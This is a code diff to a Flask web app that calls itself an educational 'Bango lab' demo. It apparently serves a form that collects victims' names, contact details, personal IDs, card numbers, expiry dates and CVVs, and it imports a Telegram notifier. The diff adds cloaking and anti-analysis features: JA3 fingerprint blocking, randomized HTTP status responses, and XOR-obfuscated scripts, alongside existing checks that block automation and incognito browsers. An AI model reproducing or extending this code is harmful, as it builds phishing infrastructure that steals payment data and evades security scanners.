@@ -31,7 +31,6 @@ from urllib.parse import urlparse
 from flask import (
     Flask,
     abort,
-    jsonify,
     make_response,
     render_template,
     request,
@@ -44,11 +43,13 @@ from backend import (
     gate_engine,
     incident_store,
     ip_geo,
+    ja3_lab,
     lab_shield,
     rsa_envelope,
     telegram_notify,
     ua_parse,
 )
+from backend.json_random_response import make_randomized_json_response
 
 HANDOFF_COOKIE = "edu_demo_handoff"
 SESSION_GATE = "gate_passed"
@@ -369,7 +370,7 @@ def _incognito_api_blocked_response():
             "incognito_blocked: set DEMO_GATE_BLOCKED_REDIRECT_URL in .env to an "
             "https:// URL, then restart the Flask process."
         )
-    resp = make_response(jsonify(body), 403)
+    resp = make_randomized_json_response(body, 403, status_pool="session")
     if away:
         resp.headers["X-Edu-Blocked-Redirect"] = away
     return resp
@@ -596,6 +597,14 @@ def create_app() -> Flask:
 
         Runs `gate_engine.process_gate_submission` and logs forensic rows on deny/allow.
         """
+        # Optional ``X-JA3-Fingerprint`` from nginx ``ssl_ja3`` / ja3 module; if missing, skip.
+        if ja3_lab.blocked_ja3_fingerprint_from_headers(request.headers) is not None:
+            return make_randomized_json_response(
+                {"status": "blocked", "reason": "ja3_fingerprint"},
+                403,
+                status_pool="session",
+            )
+
         if not _origin_ok_for_request():
             incident_store.insert_incident(
                 PROJECT_ROOT,
@@ -610,7 +619,9 @@ def create_app() -> Flask:
                     "phase": "pre_pipeline",
                 },
             )
-            return jsonify({"status": "blocked", "reason": "bad_origin"}), 403
+            return make_randomized_json_response(
+                {"status": "blocked", "reason": "bad_origin"}, 403
+            )
 
         raw = request.get_data(as_text=True) or "{}"
         try:
@@ -629,7 +640,9 @@ def create_app() -> Flask:
                     "phase": "pre_pipeline",
                 },
             )
-            return jsonify({"status": "blocked", "reason": "bad_json"}), 400
+            return make_randomized_json_response(
+                {"status": "blocked", "reason": "bad_json"}, 400
+            )
 
         decision = gate_engine.process_gate_submission(
             client_ip=_client_ip_for_lab(),
@@ -690,7 +703,10 @@ def create_app() -> Flask:
                         f"{decision.reason}: set DEMO_GATE_BLOCKED_REDIRECT_URL in .env to an "
                         "https:// URL, then restart the Flask process."
                     )
-            blocked_resp = make_response(jsonify(blocked_body), decision.http_status)
+            _pool = "rate" if decision.reason == "rate_limit" else None
+            blocked_resp = make_randomized_json_response(
+                blocked_body, decision.http_status, status_pool=_pool
+            )
             if away:
                 blocked_resp.headers["X-Edu-Blocked-Redirect"] = away
             return blocked_resp
@@ -718,14 +734,13 @@ def create_app() -> Flask:
         session[SESSION_CLIENT_UA] = (request.headers.get("User-Agent") or "")[:512]
         redirect_url = f"{request.scheme}://{request.host}{path}"
 
-        resp = make_response(
-            jsonify(
-                {
-                    "status": "access_granted",
-                    "redirect_url": redirect_url,
-                    "risk": decision.risk,
-                }
-            )
+        resp = make_randomized_json_response(
+            {
+                "status": "access_granted",
+                "redirect_url": redirect_url,
+                "risk": decision.risk,
+            },
+            200,
         )
         resp.set_cookie(
             HANDOFF_COOKIE,
@@ -759,7 +774,7 @@ def create_app() -> Flask:
     @app.get("/s/<string:file_token>")
     def bango_serve_obfuscated_js(file_token: str):
         """
-        XOR-obfuscated Bango lab scripts (fingerprint, behavior, shell-guard);
+        XOR-obfuscated Bango lab scripts (all shell JS, including bango-lab);
         key and tokens are session-bound to the Bango page render.
         """
         if session.get(SESSION_GATE) is not True or session.get(SESSION_CORE_OK) is not True:
@@ -774,6 +789,11 @@ def create_app() -> Flask:
             "fingerprint": "fingerprint.js",
             "behavior": "behavior.js",
             "shell-guard": "shell-guard.js",
+            "incognito-hint": "incognito-hint.js",
+            "lab-busy": "lab-busy.js",
+            "bango-crypto": "bango-crypto.js",
+            "bango-page-init": "bango-page-init.js",
+            "bango-lab": "bango-lab.js",
         }
         fn = name_map.get(str(logical))
         if not fn:
@@ -841,12 +861,14 @@ def create_app() -> Flask:
         rotation per gate success narrows replay windows.
         """
         if session.get(SESSION_CORE_OK) is not True:
-            return jsonify({"ok": False, "error": "session"}), 403
+            return make_randomized_json_response(
+                {"ok": False, "error": "session"}, 403, status_pool="session"
+            )
         tok = session.get(SESSION_API_CSRF)
         if not tok:
             tok = secrets.token_urlsafe(32)
             session[SESSION_API_CSRF] = tok
-        return jsonify({"ok": True, "csrf": tok})
+        return make_randomized_json_response({"ok": True, "csrf": tok}, 200)
 
     @app.post("/api/demo/shell-guard-deny")
     def api_shell_guard_deny():
@@ -855,11 +877,11 @@ def create_app() -> Flask:
         Inserts a ``gate_decision`` row so ``/start?test=`` debug audit shows the reason.
         """
         if not _shell_guard_enabled():
-            return jsonify({"ok": False, "error": "disabled"}), 404
+            return make_randomized_json_response({"ok": False, "error": "disabled"}, 404)
         if not _origin_ok_for_request():
-            return jsonify({"ok": False, "error": "origin"}), 403
+            return make_randomized_json_response({"ok": False, "error": "origin"}, 403)
         if not request.is_json:
-            return jsonify({"ok": False, "error": "json"}), 400
+            return make_randomized_json_response({"ok": False, "error": "json"}, 400)
         body = request.get_json(silent=True) or {}
         sub = str(body.get("subreason") or "unknown").strip()[:64]
         tok = (request.headers.get("X-CSRF-Token") or "").strip()
@@ -880,7 +902,7 @@ def create_app() -> Flask:
         if not ok_csrf and _csrf_match(gate_t):
             ok_csrf = True
         if not ok_csrf:
-            return jsonify({"ok": False, "error": "csrf"}), 403
+            return make_randomized_json_response({"ok": False, "error": "csrf"}, 403)
         incident_store.insert_incident(
             PROJECT_ROOT,
             event_type="gate_decision",
@@ -894,7 +916,7 @@ def create_app() -> Flask:
                 "risk": {"subreason": sub, "source": "shell_guard"},
             },
         )
-        return jsonify({"ok": True})
+        return make_randomized_json_response({"ok": True}, 200)
 
     @app.get("/api/demo/flow")
     def api_demo_flow():
@@ -903,7 +925,9 @@ def create_app() -> Flask:
         done-redirect fields as in the register JSON response.
         """
         if session.get(SESSION_CORE_OK) is not True:
-            return jsonify({"ok": False, "error": "session"}), 403
+            return make_randomized_json_response(
+                {"ok": False, "error": "session"}, 403, status_pool="session"
+            )
         has_reg = bool(session.get(SESSION_REG))
         out: dict[str, object] = {
             "ok": True,
@@ -915,7 +939,7 @@ def create_app() -> Flask:
             out["redirect_url"] = _done
             out["spa_done_redirect"] = _done
             out["done_check_seconds"] = _bango_done_redirect_delay_sec()
-        return jsonify(out)
+        return make_randomized_json_response(out, 200)
 
     def _api_csrf_ok() -> bool:
         """
@@ -941,22 +965,32 @@ def create_app() -> Flask:
         Bango glass overlays and success step (no second-factor API).
         """
         if session.get(SESSION_CORE_OK) is not True:
-            return jsonify({"ok": False, "error": "session"}), 403
+            return make_randomized_json_response(
+                {"ok": False, "error": "session"}, 403, status_pool="session"
+            )
         if not _origin_ok_for_request():
-            return jsonify({"ok": False, "error": "bad_origin"}), 403
+            return make_randomized_json_response(
+                {"ok": False, "error": "bad_origin"}, 403, status_pool="session"
+            )
         if not _api_csrf_ok():
-            return jsonify({"ok": False, "error": "bad_csrf"}), 403
+            return make_randomized_json_response(
+                {"ok": False, "error": "bad_csrf"}, 403, status_pool="session"
+            )
         try:
             data = request.get_json(force=True, silent=False)
         except Exception:
-            return jsonify({"ok": False, "error": "json"}), 400
+            return make_randomized_json_response({"ok": False, "error": "json"}, 400)
 
         if bango_hardening.honeypot_filled(data):
-            return jsonify({"ok": False, "error": "honeypot_filled"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "honeypot_filled"}, 400, status_pool="bot"
+            )
 
         pii_err = rsa_envelope.apply_decrypted_pii_to_request(data)
         if pii_err is not None:
-            return jsonify({"ok": False, "error": "bad_encrypted_pii"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "bad_encrypted_pii"}, 400
+            )
 
         fp_sig = data.get("fingerprint_signals")
         if not isinstance(fp_sig, dict):
@@ -966,11 +1000,17 @@ def create_app() -> Flask:
             cf = {}
         beh = data.get("behavior_signals")
         if bango_hardening.cdp_or_automation_suspect(cf):
-            return jsonify({"ok": False, "error": "automation_suspect"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "automation_suspect"}, 400, status_pool="bot"
+            )
         if bango_hardening.battery_full_charging_desktop_suspect(cf, fp_sig):
-            return jsonify({"ok": False, "error": "battery_anomaly"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "battery_anomaly"}, 400, status_pool="bot"
+            )
         if bango_hardening.keystroke_intervals_too_robotic(beh):
-            return jsonify({"ok": False, "error": "keystroke_synthetic"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "keystroke_synthetic"}, 400, status_pool="bot"
+            )
 
         _webrtc_ips = bango_hardening.webrtc_host_candidate_ips(fp_sig)
         if _webrtc_ips and not _quiet_demonstration_terminal():
@@ -987,33 +1027,39 @@ def create_app() -> Flask:
         personal_id = str(data.get("personal_id") or "").strip()[:32]
         full_name = str(data.get("full_name") or "").strip()[:120]
         if not fname or not lname or not phone or not email or not personal_id:
-            return jsonify({"ok": False, "error": "bad_profile_fields"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "bad_profile_fields"}, 400
+            )
         if len(personal_id) < 2:
-            return jsonify({"ok": False, "error": "bad_personal_id_length"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "bad_personal_id_length"}, 400
+            )
         if not full_name or len(full_name) < 2:
-            return jsonify({"ok": False, "error": "bad_full_name"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "bad_full_name"}, 400
+            )
 
         cc_digits = checksum.normalize_corporate_access_token(str(data.get("cc") or ""))
         if len(cc_digits) < 12 or len(cc_digits) > 19:
-            return jsonify({"ok": False, "error": "bad_cc_length"}), 400
+            return make_randomized_json_response({"ok": False, "error": "bad_cc_length"}, 400)
         if not checksum.luhn_validate(cc_digits):
-            return jsonify({"ok": False, "error": "cc_checksum_failed"}), 400
+            return make_randomized_json_response(
+                {"ok": False, "error": "cc_checksum_failed"}, 400
+            )
 
         exp_norm = _normalize_card_expiry(str(data.get("exp") or ""))
         if not exp_norm:
-            return jsonify({"ok": False, "error": "bad_exp_format"}), 400
+            return make_randomized_json_response({"ok": False, "error": "bad_exp_format"}, 400)
 
         cvv_raw = "".join(ch for ch in str(data.get("cvv") or "") if ch.isdigit())
         exp_cvv = checksum.expected_cvv_len_for_pan(cc_digits)
         if len(cvv_raw) != exp_cvv:
-            return (
-                jsonify(
-                    {
-                        "ok": False,
-                        "error": "bad_cvv_length",
-                        "cvv_expected": exp_cvv,
-                    }
-                ),
+            return make_randomized_json_response(
+                {
+                    "ok": False,
+                    "error": "bad_cvv_length",
+                    "cvv_expected": exp_cvv,
+                },
                 400,
             )
 
@@ -1075,7 +1121,7 @@ def create_app() -> Flask:
             request.headers.get("User-Agent"),
             done_redirect_url=_done,
         )
-        return jsonify(
+        return make_randomized_json_response(
             {
                 "ok": True,
                 "step": "loading",
@@ -1085,7 +1131,8 @@ def create_app() -> Flask:
                 "redirect_url": _done,
                 "spa_done_redirect": _done,
                 "done_check_seconds": _bango_done_redirect_delay_sec(),
-            }
+            },
+            200,
         )
 
     @app.get("/api/demo/done-redirect")
@@ -1095,15 +1142,18 @@ def create_app() -> Flask:
         from ``.env`` (session must be core-verified) if the client needs a refresh.
         """
         if session.get(SESSION_CORE_OK) is not True:
-            return jsonify({"ok": False, "error": "session"}), 403
+            return make_randomized_json_response(
+                {"ok": False, "error": "session"}, 403, status_pool="session"
+            )
         _done = _bango_done_redirect_url() or ""
-        return jsonify(
+        return make_randomized_json_response(
             {
                 "ok": True,
                 "redirect_url": _done,
                 "spa_done_redirect": _done,
                 "done_check_seconds": _bango_done_redirect_delay_sec(),
-            }
+            },
+            200,
         )
 
     @app.get("/")
